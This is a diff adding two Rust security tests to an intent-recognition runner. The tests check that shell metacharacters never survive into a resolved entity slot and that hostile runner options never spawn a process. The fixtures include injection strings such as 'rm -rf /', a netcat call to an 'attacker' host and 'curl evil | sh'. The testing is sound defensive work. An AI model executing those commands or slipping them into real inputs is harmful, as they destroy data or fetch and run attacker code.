@@ -394,6 +394,63 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn shell_metachars_never_survive_into_a_resolved_slot() {
+        // SECURITY (command/argument injection): two layers of defense.
+        //   1. There is NO subprocess — `spawn` is a lifecycle flag and
+        //      `RufloRunnerOpts` is inert, so no argv is ever built.
+        //   2. Even so, the `entity_id` capture class is `[a-z_][a-z0-9_ .]*`,
+        //      which *excludes* every shell metacharacter. So when an
+        //      injection-shaped utterance DOES resolve (the regex is not exact-
+        //      anchored), the captured slot is a clean token with the hostile
+        //      tail stripped — never `;`, `|`, `$`, backtick, `&`, `/`, etc.
+        // This pins the slot-sanitisation-by-construction property: a slot value
+        // can never carry a metachar into a (future) argv.
+        let mut runner = LocalRunner::new(turn_on_recognizer().await);
+        runner.spawn(RufloRunnerOpts::default()).await.unwrap();
+        const METACHARS: &[char] = &[';', '|', '&', '$', '`', '/', '\\', '>', '<', '\n', '"', '\''];
+        for evil in [
+            "turn on the light; rm -rf /",
+            "turn on the light && shutdown -h now",
+            "turn on the light | nc attacker 4444",
+            "turn on the light `curl evil.sh | sh`",
+            "turn on the light $(reboot)",
+        ] {
+            let resp = runner
+                .send_request(serde_json::json!({"utterance": evil, "language": "en"}))
+                .await
+                .unwrap();
+            if let Some(intent) = resp.intent {
+                if let Some(eid) = intent.entity_id() {
+                    assert!(
+                        !eid.chars().any(|c| METACHARS.contains(&c)),
+                        "resolved entity_id {eid:?} from {evil:?} must contain no shell metachars"
+                    );
+                }
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn runner_opts_are_inert_no_process_spawned() {
+        // SECURITY (command injection): even a hostile `script_path` / `env` in
+        // RufloRunnerOpts is never consumed — `spawn` launches no process. This
+        // documents-and-pins that the data-gated P2 subprocess is genuinely
+        // absent (confirmed Noop/Local, no spawn surface today).
+        let mut env = std::collections::HashMap::new();
+        env.insert("EVIL".to_owned(), "$(rm -rf /)".to_owned());
+        let opts = RufloRunnerOpts {
+            script_path: "/bin/sh -c 'curl evil | sh'".to_owned(),
+            env,
+            timeout_ms: 1,
+        };
+        let mut runner = NoopRunner::new();
+        // No panic, no spawn, no error — the opts are pure data.
+        assert!(runner.spawn(opts.clone()).await.is_ok());
+        let mut local = LocalRunner::new(turn_on_recognizer().await);
+        assert!(local.spawn(opts).await.is_ok());
+    }
+
+    #[tokio::test]
     async fn local_runner_send_before_spawn_is_not_started() {
         let runner = LocalRunner::new(turn_on_recognizer().await);
         let err = runner
